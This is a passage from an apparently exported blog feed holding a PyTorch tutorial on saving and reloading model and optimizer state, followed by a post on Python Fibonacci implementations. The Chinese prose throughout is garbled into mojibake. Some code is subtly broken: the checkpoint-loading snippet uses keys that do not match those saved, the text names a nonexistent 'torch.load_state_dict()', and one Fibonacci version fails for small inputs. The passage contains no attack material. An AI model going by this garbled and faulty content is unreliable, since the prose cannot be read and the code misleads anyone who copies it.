class="number">1</span>)</span><br><span class="line">        self.layer.weight = nn.Parameter(torch.FloatTensor([[<span class="number">10</span>]]))</span><br><span class="line">        self.layer.bias = nn.Parameter(torch.FloatTensor([<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">         y = self.layer(x)</span><br><span class="line">        <span class="keyword">return</span> y</span><br></pre></td></tr></table></figure><p>æˆ‘<strong>å°†å…¨è¿æ¥çš„æƒé‡wå’Œåå·®båˆ†åˆ«è®¾ç½®ä¸º10å’Œ1</strong>ï¼Œå…¨è¿æ¥çš„è®¡ç®—æ–¹å¼å¦‚ä¸‹ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/0.png"><br>å‡è®¾è¾“å…¥x=1ï¼Œå¯ä»¥çŸ¥é“yå€¼ä¸º11ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/1.png"><br>æµ‹è¯•ä¸€ä¸‹è¾“å‡ºæ˜¯ä¸æ˜¯11ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = torch.FloatTensor([[<span class="number">1</span>]])</span><br><span class="line">net = Net()</span><br><span class="line">out = net(x)</span><br><span class="line"><span class="built_in">print</span>(out)</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼štensor([[11.]], grad_fn=<AddmmBackward>)ï¼Œè¯´æ˜ä¸Šè¿°è®¡ç®—æ˜¯æ­£ç¡®çš„ã€‚ä¸é‡‡ç”¨å‚æ•°éšæœºåˆå§‹åŒ–ï¼Œè€Œæ˜¯ç”¨ç‰¹æ®Šçš„æ•°å€¼åˆå§‹åŒ–ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬å¸Œæœ›<strong>é‡è½½æ¨¡å‹çš„æ—¶å€™ï¼Œèƒ½å¤Ÿä»ç‰¹æ®Šæ•°å€¼ä¸€çœ¼åˆ¤æ–­å‡ºä¿å­˜å’Œé‡è½½è¿‡ç¨‹æ˜¯å¦æ­£ç¡®</strong>ï¼Œä¹Ÿå¯ä»¥æŠŠæƒé‡è®¾ç½®ä¸ºä¸€å¼ å›¾ç‰‡æ•°å€¼ï¼Œç„¶ååˆ¤æ–­åŠ è½½çš„å‚æ•°å€¼èƒ½ä¸èƒ½æ¢å¤åŸå›¾ã€‚</p><h2 id="äºŒã€ä¿å­˜Netçš„å‚æ•°å€¼"><a href="#äºŒã€ä¿å­˜Netçš„å‚æ•°å€¼" class="headerlink" title="äºŒã€ä¿å­˜Netçš„å‚æ•°å€¼"></a>äºŒã€ä¿å­˜Netçš„å‚æ•°å€¼</h2><p>ä¿å­˜æ¨¡å‹å‚æ•°ä¹‹å‰ï¼Œéœ€è¦çŸ¥é“<strong>Netçš„å‚æ•°å€¼å­˜å‚¨åœ¨å…¶state_dictï¼ˆçŠ¶æ€å­—å…¸ï¼‰å±æ€§ä¸­</strong>ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹netçš„state_dictåŒ…å«å“ªäº›å‚æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(net.state_dict())</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä¼šå¾—åˆ°<strong>netåŒ…å«çš„æ‰€æœ‰å‚æ•°åç§°ä¸å‚æ•°å€¼</strong>ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/2.png"><br>åŒ…å«ä¸€ä¸ªweightå’Œä¸€ä¸ªbiasï¼Œå¯¹åº”çš„å€¼åˆ†åˆ«æ˜¯10å’Œ1ï¼Œå’Œæˆ‘ä»¬ä¹‹å‰å®šä¹‰çš„å…¨è¿æ¥å±‚ä¸€è‡´ã€‚æˆ‘ä»¬éœ€è¦ä¿å­˜çš„å°±æ˜¯è¿™ä¸ªstate_dictï¼Œä¿å­˜çš„å‡½æ•°ä¸ºâ€œtorch.save()â€ï¼Œ<strong>å‚æ•°æ˜¯æˆ‘ä»¬éœ€è¦ä¿å­˜çš„dictå’Œå­˜å‚¨è·¯å¾„</strong>ï¼š<br>torch.save(obj=net.state_dict(), f=â€models/net.pthâ€)<br>ç°åœ¨ï¼ŒåŒçº§ç›®å½•modelsä¸‹å°†ä¼šå‡ºç°net.pthæ–‡ä»¶ï¼Œpthæ–‡ä»¶ä¸­çš„å†…å®¹å°±æ˜¯netçš„å‚æ•°åç§°å’Œå€¼å¯¹åº”çš„state_dictï¼Œå¦‚ä¸‹ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/3.png"></p><h2 id="ä¸‰ã€åŠ è½½Netå‚æ•°å€¼å¹¶ç”¨äºæ–°çš„æ¨¡å‹"><a href="#ä¸‰ã€åŠ è½½Netå‚æ•°å€¼å¹¶ç”¨äºæ–°çš„æ¨¡å‹" class="headerlink" title="ä¸‰ã€åŠ è½½Netå‚æ•°å€¼å¹¶ç”¨äºæ–°çš„æ¨¡å‹"></a>ä¸‰ã€åŠ è½½Netå‚æ•°å€¼å¹¶ç”¨äºæ–°çš„æ¨¡å‹</h2><p>æœ€åä¸€ä¸ªæ­¥éª¤å°±æ˜¯ä»pthæ–‡ä»¶ä¸­é‡æ–°è·å–Netå‚æ•°å€¼ï¼Œå¹¶æŠŠå‚æ•°å€¼è£…è½½åˆ°æ–°å®šä¹‰çš„Modelå¯¹è±¡ä¸­ã€‚è¿™é‡Œæˆ‘ä»¬é‡æ–°å®šä¹‰ä¸€ä¸ªç»“æ„å’ŒNetç±»ç›¸åŒçš„ç±»Modelï¼Œ<strong>åŒºåˆ«ä»…ä»…æ˜¯Modelå‚æ•°åˆå§‹å€¼å’ŒNetä¸åŒ</strong>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Model, self).__init__()</span><br><span class="line">        self.layer = nn.Linear(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        self.layer.weight = nn.Parameter(torch.FloatTensor([[<span class="number">0</span>]]))</span><br><span class="line">        self.layer.bias = nn.Parameter(torch.FloatTensor([<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        out = self.layer(x)</span><br><span class="line">        <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°†Modelçš„åˆå§‹å€¼æƒé‡wå’Œåå·®éƒ½è®¾ç½®ä¸º0ï¼ŒæŸ¥çœ‹å…¶state_dictï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">model = Model()</span><br><span class="line"><span class="built_in">print</span>(model.state_dict())</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„wå’Œbå€¼ä¸é¢„æœŸç›¸åŒï¼Œå‡ä¸º0ï¼Œå¦‚ä¸‹ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/4.png"><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†modelå¯¹è±¡çš„å‚æ•°å€¼è®¾ç½®ä¸ºnet.pthä¸­çš„å€¼ï¼Œéœ€è¦<strong>ä½¿ç”¨â€œmodel.load_state_dict()â€å‡½æ•°é‡ç½®modelçš„å‚æ•°å€¼ä¸ºâ€torch.load(models/ net.pth)â€ä¸­çš„å‚æ•°å€¼</strong>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">model.load_state_dict(torch.load(<span class="string">&quot;models/net.pth&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(model.state_dict())</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œmodelçš„wå’Œbå€¼å°±ä¸å†æ˜¯0äº†ï¼Œè€Œæ˜¯netä¸­wå’Œbå¯¹åº”çš„10å’Œ1ï¼Œå¦‚ä¸‹ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/5.png"><br>å…¶ä¸­å‚æ•°å€¼é‡è½½çš„æ ¸å¿ƒå‡½æ•°ä¸ºâ€œmodel.load_state_dict()â€ï¼Œæ¯ä¸ªç»§æ‰¿è‡ªnn.Moduleçš„ç½‘ç»œéƒ½èƒ½é€šè¿‡è¿™ä¸ªå‡½æ•°è®¾å®šå‚æ•°å€¼ã€‚</p><h2 id="å››ã€ä¼˜åŒ–å™¨ä¸epochçš„ä¿å­˜"><a href="#å››ã€ä¼˜åŒ–å™¨ä¸epochçš„ä¿å­˜" class="headerlink" title="å››ã€ä¼˜åŒ–å™¨ä¸epochçš„ä¿å­˜"></a>å››ã€ä¼˜åŒ–å™¨ä¸epochçš„ä¿å­˜</h2><p>ä¿å­˜ä¼˜åŒ–å™¨å‚æ•°å€¼å’Œepochå€¼çš„ä¸»è¦ç›®çš„æ˜¯ç”¨äºç»§ç»­è®­ç»ƒï¼Œä¿å­˜çš„æµç¨‹ä¾æ—§æ˜¯å…ˆâ€œtorch.save()â€å†â€œtorch.load_state_dict()â€ï¼Œæˆ‘ä»¬é¦–å…ˆå®šä¹‰ä¸€ä¸ªAdamä¼˜åŒ–å™¨ã€ä¸€ä¸ªä»»æ„çš„epochå€¼ä¸netå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net = Net()</span><br><span class="line">Adam = optim.Adam(params=net.parameters(), lr=<span class="number">0.001</span>, betas=(<span class="number">0.5</span>, <span class="number">0.999</span>))</span><br><span class="line">epoch = <span class="number">96</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œ<strong>åˆ›å»ºä¸€ä¸ªå­—å…¸æ¥ä¿å­˜æ‰€æœ‰çš„å¯¹è±¡ï¼Œå¹¶ç”¨saveå‡½æ•°ä¿å­˜è¿™ä¸ªå­—å…¸</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">all_states = &#123;<span class="string">&quot;net&quot;</span>: net.state_dict(), <span class="string">&quot;Adam&quot;</span>: Adam.state_dict(), <span class="string">&quot;epoch&quot;</span>: epoch&#125;</span><br><span class="line">torch.save(obj=all_states, f=<span class="string">&quot;models/all_states.pth&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰çš„å¯¹è±¡éƒ½è¢«ä¿å­˜åˆ°modelsæ–‡ä»¶å¤¹ä¸‹äº†ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/6.png"><br>å¯ä»¥ä½¿ç”¨load()å‡½æ•°æŠŠæ‰€æœ‰çš„å¯¹è±¡å†æ¬¡æå–å‡ºæ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reload_states = torch.load(<span class="string">&quot;models/all_states.pth&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(reload_states)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„æ‰€æœ‰å‚æ•°å¦‚ä¸‹ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/7.png"><br>è¡¥å……ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">checkpoint = torch.load(<span class="string">&quot;models/all_states.pth&quot;</span>)</span><br><span class="line">model.load_state_dict(checkpoint[<span class="string">&#x27;model&#x27;</span>])</span><br><span class="line">optimizer.load_state_dict(checkpoint[<span class="string">&#x27;optimizer&#x27;</span>])</span><br><span class="line">start_epoch = checkpoint[<span class="string">&#x27;epoch&#x27;</span>]+<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="äº”ã€æ€»ç»“"><a href="#äº”ã€æ€»ç»“" class="headerlink" title="äº”ã€æ€»ç»“"></a>äº”ã€æ€»ç»“</h2><p>pytorchä¸­state_dict()å’Œload_state_dict()å‡½æ•°é…åˆä½¿ç”¨å¯ä»¥å®ç°çŠ¶æ€çš„è·å–ä¸é‡è½½ï¼Œload()å’Œsave()å‡½æ•°é…åˆä½¿ç”¨å¯ä»¥å®ç°å‚æ•°çš„å­˜å‚¨ä¸è¯»å–ã€‚å…¶ä¸­æœ€é‡è¦çš„éƒ¨åˆ†æ˜¯â€œå­—å…¸â€çš„æ¦‚å¿µï¼Œå› ä¸ºå‚æ•°å¯¹è±¡çš„å­˜å‚¨æ˜¯éœ€è¦â€œåç§°â€â€”â€”â€œå€¼â€å¯¹åº”ï¼ˆå³é”®å€¼å¯¹ï¼‰ï¼Œè¯»å–æ—¶ä¹Ÿæ˜¯é€šè¿‡é”®å€¼å¯¹è¯»å–çš„ã€‚</p><p><strong><em>å‚è€ƒï¼š</em></strong><br><a href="https://snowgo.top/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/8.png">https://zhuanlan.zhihu.com/p/94971100</a><br><a href="https://snowgo.top/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/9.png">https://www.pytorchtutorial.com/pytorch-note5-save-and-restore-models/</a><br><a href="https://snowgo.top/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/10.png">https://blog.csdn.net/Code_Mart/article/details/88254444</a></p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonç®—æ³•â€”â€”é•¿æœŸæ›´æ–°</title>
      <link href="/2021/07/28/Python%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/"/>
      <url>/2021/07/28/Python%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="ç±»å‹æç¤º"><a href="#ç±»å‹æç¤º" class="headerlink" title="ç±»å‹æç¤º"></a>ç±»å‹æç¤º</h2><p>å°±æ˜¯è¯´ä¸€ä¸‹è¿™ä¸ªå˜é‡æ˜¯ä»€ä¹ˆç±»å‹ç”¨çš„ï¼Œå†™äº†ä¹Ÿä¸ç¼–è¯‘ï¼Œå°±åˆ°æ—¶å€™èƒ½ç»™æ£€æŸ¥ä¸€ä¸‹ï¼Œä¸å®¹æ˜“å‡ºé”™ï¼Œè¿™æ ·å†™çš„ä»£ç ä¹Ÿå¥½è¯»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repeat</span>(<span class="params">item, times</span>):</span></span><br><span class="line"><span class="comment">##æ·»åŠ ç±»å‹æç¤º</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repeat</span>(<span class="params">item: <span class="type">Any</span>,times:<span class="built_in">int</span></span>) -&gt;<span class="type">List</span>[<span class="type">Any</span>]:</span></span><br></pre></td></tr></table></figure><h2 id="ç¬¬1ç« "><a href="#ç¬¬1ç« " class="headerlink" title="ç¬¬1ç« "></a>ç¬¬1ç« </h2><h3 id="æ–æ³¢é‚£å¥‘"><a href="#æ–æ³¢é‚£å¥‘" class="headerlink" title="æ–æ³¢é‚£å¥‘"></a>æ–æ³¢é‚£å¥‘</h3><h4 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">num: <span class="built_in">int</span></span>) -&gt;<span class="built_in">int</span>:</span></span><br><span class="line">    <span class="keyword">if</span> num==<span class="number">1</span> <span class="keyword">or</span> num ==<span class="number">0</span>:</span><br><span class="line">     <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">return</span> fib(num-<span class="number">1</span>)+fib(num-<span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(fib(<span class="number">5</span>))</span><br></pre></td></tr></table></figure><h4 id="è®°å¿†åŒ–æœç´¢"><a href="#è®°å¿†åŒ–æœç´¢" class="headerlink" title="è®°å¿†åŒ–æœç´¢"></a>è®°å¿†åŒ–æœç´¢</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span></span><br><span class="line">memo :<span class="type">Dict</span>[<span class="built_in">int</span>,<span class="built_in">int</span>] = &#123;<span class="number">0</span>:<span class="number">0</span>,<span class="number">1</span>:<span class="number">1</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">not</span> <span class="keyword">in</span> memo:</span><br><span class="line">        memo[num] = fib(num-<span class="number">1</span>) + fib(num-<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> memo[num]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(fib(<span class="number">50</span>))</span><br></pre></td></tr></table></figure><h4 id="è£…é¥°å™¨è‡ªåŠ¨è®°å¿†åŒ–"><a href="#è£…é¥°å™¨è‡ªåŠ¨è®°å¿†åŒ–" class="headerlink" title="è£…é¥°å™¨è‡ªåŠ¨è®°å¿†åŒ–"></a>è£…é¥°å™¨è‡ªåŠ¨è®°å¿†åŒ–</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> lru_cache</span><br><span class="line"><span class="meta">@lru_cache(<span class="params">maxsize=<span class="literal">None</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span> :</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">return</span> fib(n-<span class="number">1</span>)+fib(n-<span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(fib(<span class="number">5</span>))</span><br></pre></td></tr></table></figure><h4 id="è¿­ä»£v1"><a href="#è¿­ä»£v1" class="headerlink" title="è¿­ä»£v1"></a>è¿­ä»£v1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    b = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>):</span><br><span class="line">        tmp = a + b</span><br><span class="line">        a = b</span><br><span class="line">        b = tmp</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">     <span class="built_in">print</span>(fib(<span class="number">5</span>))</span><br></pre></td></tr></table></figure><h4 id="è¿­ä»£v2"><a href="#è¿­ä»£v2" class="headerlink" title="è¿­ä»£v2"></a>è¿­ä»£v2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    last=<span class="number">0</span></span><br><span class="line">    <span class="built_in">next</span>=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">        last,<span class="built_in">next</span> = <span class="built_in">next</span>,last+<span class="built_in">next</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">next</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">     <span class="built_in">print</span>(fib(<span class="number">5</span>))</span><br></pre></td></tr></table></figure><h4 id="ç”¨ç”Ÿæˆå™¨ç”Ÿæˆå‰51ä¸ªæ•°"><a href="#ç”¨ç”Ÿæˆå™¨ç”Ÿæˆå‰51ä¸ªæ•°" class="headerlink" title="ç”¨ç”Ÿæˆå™¨ç”Ÿæˆå‰51ä¸ªæ•°"></a>ç”¨ç”Ÿæˆå™¨ç”Ÿæˆå‰51ä¸ªæ•°</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> n&gt;<span class="number">1</span> :</span><br><span class="line">        <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    last=<span class="number">0</span></span><br><span class="line">    <span class="built_in">next</span>=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">        last,<span class="built_in">next</span> = <span class="built_in">next</span>,last+<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">yield</span> <span class="built_in">next</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> fib(<span class="number">50</span>):</span><br><span class="line">         <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><h3 id="ç®€å•çš„å‹ç¼©ç®—æ³•"><a href="#ç®€å•çš„å‹ç¼©ç®—æ³•" class="headerlink" title="ç®€å•çš„å‹ç¼©ç®—æ³•"></a>ç®€å•çš„å‹ç¼©ç®—æ³•</h3><blockquote><p>å¦‚æœç±»çš„æ–¹æ³•æˆ–å®ä¾‹å˜é‡åç”¨ä¸¤ä¸ªä¸‹åˆ’çº¿å¼€å¤´ï¼ŒPythonå°†ä¼šå¯¹å…¶è¿›è¡Œåç§°æ··æ·†ï¼ˆname mangleï¼‰ï¼Œé€šè¿‡åŠ å…¥ç›å€¼ï¼ˆsaltï¼‰æ¥æ”¹å˜å…¶åœ¨å®ç°æ—¶çš„åç§°ï¼Œä½¿å…¶ä¸æ˜“è¢«å…¶ä»–ç±»å‘ç°ã€‚æœ¬ä¹¦ç”¨ä¸€æ¡ä¸‹åˆ’çº¿è¡¨ç¤ºâ€œç§æœ‰â€å˜é‡æˆ–æ–¹æ³•ï¼Œä½†å¦‚æœçœŸè¦å¼ºè°ƒä¸€äº›ç§æœ‰å†…å®¹ï¼Œæˆ–è®¸å¾—ç”¨ä¸¤æ¡ä¸‹åˆ’çº¿æ‰åˆé€‚ã€‚è¦è·å–æœ‰å…³Pythonå‘½åçš„æ›´å¤šä¿¡æ¯ï¼Œå‚é˜…PEP 8ä¸­<br>çš„â€œæè¿°æ€§å‘½åé£æ ¼â€ï¼ˆDescriptive Naming Stylesï¼‰éƒ¨åˆ†ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CompressedGene</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, gene: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self._compress(gene)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_compress</span>(<span class="params">self, gene: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.bit_string: <span class="built_in">int</span> = <span class="number">1</span>  <span class="comment">## start with 